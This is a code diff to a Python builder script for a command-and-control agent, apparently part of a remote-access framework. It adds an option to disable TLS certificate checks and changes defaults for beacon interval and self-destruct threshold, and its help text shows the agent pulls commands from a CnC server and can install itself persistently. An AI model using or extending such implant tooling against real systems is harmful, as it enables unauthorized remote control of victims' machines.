@@ -5,7 +5,7 @@ import shutil
 import tempfile
 
 
-def build_agent(output, server_url, platform, hello_interval, idle_time, max_failed_connections, persist):
+def build_agent(output, server_url, platform, hello_interval, idle_time, max_failed_connections, persist, tls_verify):
     prog_name = os.path.basename(output)
     platform = platform.lower()
     if platform not in ['linux', 'windows']:
@@ -27,6 +27,7 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
         config_file = config_file.replace("__IDLE_TIME__", str(idle_time))
         config_file = config_file.replace("__MAX_FAILED_CONNECTIONS__", str(max_failed_connections))
         config_file = config_file.replace("__PERSIST__", str(persist))
+        config_file = config_file.replace("__TLS_VERIFY__", str(tls_verify))
         agent_config.write(config_file)
     cwd = os.getcwd()
     os.chdir(working_dir)
@@ -54,10 +55,11 @@ def main():
     parser.add_argument('-p', '--platform', required=True, help="Target platform (Windows, Linux).")
     parser.add_argument('--server', required=True, help="Address of the CnC server (e.g http://localhost:8080).")
     parser.add_argument('-o', '--output', required=True, help="Output file name.")
-    parser.add_argument('--hello-interval', type=int, default=1, help="Delay (in seconds) between each request to the CnC.")
+    parser.add_argument('--hello-interval', type=int, default=10, help="Delay (in seconds) between each request to the CnC.")
     parser.add_argument('--idle-time', type=int, default=60, help="Inactivity time (in seconds) after which to go idle. In idle mode, the agent pulls commands less often (every <hello_interval> seconds).")
-    parser.add_argument('--max-failed-connections', type=int, default=20, help="The agent will self destruct if no contact with the CnC can be made <max_failed_connections> times in a row.")
+    parser.add_argument('--max-failed-connections', type=int, default=2000, help="The agent will self destruct if no contact with the CnC can be made <max_failed_connections> times in a row.")
     parser.add_argument('--persistent', action='store_true', help="Automatically install the agent on first run.")
+    parser.add_argument('--no-check-certificate', action='store_true', help="Disable server TLS certificate verification.")
     args = parser.parse_args()
 
     build_agent(
@@ -67,7 +69,8 @@ def main():
         hello_interval=args.hello_interval,
         idle_time=args.idle_time,
         max_failed_connections=args.max_failed_connections,
-        persist=args.persistent)
+        persist=args.persistent,
+        tls_verify=(not args.no_check_certificate))
 
 
 if __name__ == "__main__":
